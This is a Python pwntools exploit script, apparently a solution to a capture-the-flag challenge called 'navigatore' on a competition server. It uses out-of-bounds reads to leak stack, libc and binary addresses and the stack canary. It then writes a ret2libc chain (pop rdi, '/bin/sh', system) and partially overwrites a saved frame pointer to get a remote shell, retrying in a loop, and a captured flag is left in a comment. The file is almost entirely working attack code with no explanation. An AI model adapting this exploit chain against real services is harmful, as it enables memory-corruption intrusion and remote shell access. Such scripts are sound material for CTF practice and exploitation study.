#!/usr/bin/env python3
from pwn import *
import warnings
warnings.filterwarnings("ignore")
exe = ELF("./navigatore")
# context.log_level='debug'
# p = remote("chal.competitivecyber.club", 8887)
libc = ELF("./libc.so.6")
def gdbs():
    context.terminal = ["foot"]
    gdb.attach(p, gdbscript="""

               """)
    # p = gdb.debug([exe.path],"""
    #
    #                 """)

sla = lambda msg, data: p.sendlineafter(msg, data)
sa = lambda msg, data: p.sendafter(msg, data)
sl = lambda data: p.sendline(data)
s = lambda data: p.send(data)
def leak(idx):
    a = b""
    for i in range(8):
        sla(">","2")
        sla(">",str(idx+i))
        p.recvuntil("Pin:")
        p.recvline()
        a+=p.recv(1)
        # log.info(f"{a}")
        libc_addr = u64(a.ljust(8,b"\0"))
    return libc_addr
def writes(idx,buffer):
    chunk_size = 1
    chunks = [buffer[i:i + chunk_size] for i in range(0, len(buffer), chunk_size)]
    # print(chunks)
    for i in range(len(chunks)):
        sla(">","1")
        sla(">",str(idx+i))
        sla(">",chunks[i])
    return
# gdbs()
while True:
    p = remote("chal.competitivecyber.club", 8887)
    # p = process([exe.path])
    # gdbs()
    # input()
    stack = leak(-48)
    # if b"000" not in hex(stack).encode():
    #     continue
        
    log.info(f"stack: {hex(stack)}")
    libc_addr = leak(-136)
    libc.address = libc_addr - 0x43654
    log.info(f"libc addr: {hex(libc.address)}")
    base = leak(-40) - 0x15cc
    log.info(f"base: {hex(base)}")

    # input()
    canary = leak(-56)
    log.info(f"canary: {hex(canary)}")
    start = stack-336
    log.info(f"start: {hex(start)}")
    gadget = stack-5440-24
    gadget2 = gadget+8
    # for i in range(3):
    editing_rbp = stack-384
    pop_rdi = libc.address + 0x000000000002a3e5
    writes(gadget2-start+16,p64(libc.sym.system))
    writes(gadget2-start+8,p64(libc.search("/bin/sh").__next__()))
    writes(gadget2-start,p64(pop_rdi))
    canary_dest = stack +0x20570+0x20550
    writes(gadget2-8-8-start,p64(canary))
    log.info(f"gadget: {hex(gadget)}")
    log.info(f"editing_rbp: {hex(editing_rbp)}")
    # gdbs()
    # input()
    sla(">","1")
    sla(">",str(editing_rbp-start))
    sla(">",p8((gadget)&0xff))
    sla(">","1")
    log.info(f"editing_rbp+1-start: {hex(editing_rbp+1-start)}")
    sla(">",str(-215))
    sla(">",p8(gadget>>8&0xff))
    sla(">","3")
    try:
        sl("echo lmaodark")
        p.recvuntil("lmaodark")
        p.interactive()
        break
    except:
        pass
    p.close()
    # sla(">","1")
    # sla(">",str(-111))
    # sla(">",p8(gadget>>8&0xff))
    # writes(-48,p16(gadget&0xffff))
    # writes(-48,p64(gadget))

    # writes(-40,p64(libc.sym.system))
    # writes()
#pctf{th4t_w45_ann0ying_014d0a7cb3d}





p.interactive()
# good luck pwning :)

